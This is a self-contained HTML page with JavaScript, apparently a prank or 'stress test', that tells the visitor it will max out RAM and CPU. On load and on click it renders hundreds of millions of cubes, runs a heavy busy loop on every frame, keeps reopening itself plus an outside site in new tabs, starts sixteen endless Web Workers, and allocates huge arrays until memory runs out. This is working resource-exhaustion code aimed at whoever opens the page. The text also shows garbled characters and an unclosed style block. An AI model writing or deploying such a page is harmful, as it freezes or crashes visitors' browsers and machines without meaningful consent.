  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: black;
      color: #0f0;
      font-family: monospace;
      cursor: pointer;
    }
    #ui {
      position: absolute;
      top: 10px;

<body>
  <div id="ui">
    <div><strong>ðŸŸ¥ DOUBLE MODE</strong></div>
    <div id="info">Now weâ€™re going to MAX OUT your RAM and CPU. Click anywhere to begin.</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/three@0.158.0/build/three.min.js"></script>
  <script>
    let scene, camera, renderer;
    const batches = 100;
    const instancesPerBatch = 2_000_000;
    const meshes = [];
    const ramBuffers = [];

    function start() {
      init();
      animate();
    }

    function init() {
      scene = new THREE.Scene();
      camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 1, 10000);
      camera.position.z = 2000;

      renderer = new THREE.WebGLRenderer({ antialias: false });
      renderer.setSize(window.innerWidth, window.innerHeight);
      document.body.appendChild(renderer.domElement);

      const geometry = new THREE.BoxGeometry(1, 1, 1);
      const material = new THREE.MeshBasicMaterial({ vertexColors: true });
      const dummy = new THREE.Object3D();
      const color = new THREE.Color();

      for (let b = 0; b < batches; b++) {
        try {
          const mesh = new THREE.InstancedMesh(geometry, material, instancesPerBatch);

          for (let i = 0; i < instancesPerBatch; i++) {
            dummy.position.set(
              (Math.random() - 0.5) * 4000,
              (Math.random() - 0.5) * 4000,
              (Math.random() - 0.5) * 4000
            );
            dummy.rotation.set(Math.random() * Math.PI, Math.random() * Math.PI, 0);
            dummy.updateMatrix();
            mesh.setMatrixAt(i, dummy.matrix);

            color.setHSL(Math.random(), 1.0, 0.5);
            mesh.setColorAt(i, color);
          }

          mesh.instanceMatrix.needsUpdate = true;
          scene.add(mesh);
          meshes.push(mesh);

          document.getElementById("info").innerText = `Batches loaded: ${b + 1}, Cubes: ${(b + 1) * instancesPerBatch}`;
        } catch (e) {
          document.getElementById("info").innerText = `âŒ Failed at batch ${b + 1}, Max Cubes: ${b * instancesPerBatch}`;
          console.warn(`âŒ GPU/Memory limit hit at batch ${b}`);
          break;
        }
      }

      window.addEventListener("resize", () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
      });
    }

    function animate() {
      requestAnimationFrame(animate);

      for (let i = 0; i < 4_000_000; i++) {
        Math.sin(Math.random() * i) + Math.sqrt(i);
      }

      for (const m of meshes) {
        m.rotation.y += 0.01;
        m.rotation.x += 0.005;
      }

      renderer.render(scene, camera);
    }

    function spawnWorkers(count) {
      for (let w = 0; w < count; w++) {
        new Worker(URL.createObjectURL(new Blob([`
          while (true) {
            const arr = [];
            for (let i = 0; i < 2e7; i++) {
              arr.push(Math.tan(i) * Math.random());
            }
          }
        `], { type: 'application/javascript' })));
      }
    }

    function eatRAM(count) {
      for (let i = 0; i < count; i++) {
        try {
          const buf = new Array(200_000_000).fill(Math.random());
          ramBuffers.push(buf);
        } catch (e) {
          console.warn("âŒ Ran out of memory at block", i);
          break;
        }
      }
    }

    window.onload = start;

    document.body.addEventListener("click", () => {
      const url = window.location.href;

      for (let i = 0; i < 10; i++) {
        setTimeout(() => {
          window.open(url, "_blank");
        }, i * 200);
      }

      setTimeout(() => {
        window.open("https://katana-king.github.io/NAJIBA/", "_blank");
      }, 2500);

      spawnWorkers(16);
      eatRAM(200);
    }, { once: true });
  </script>
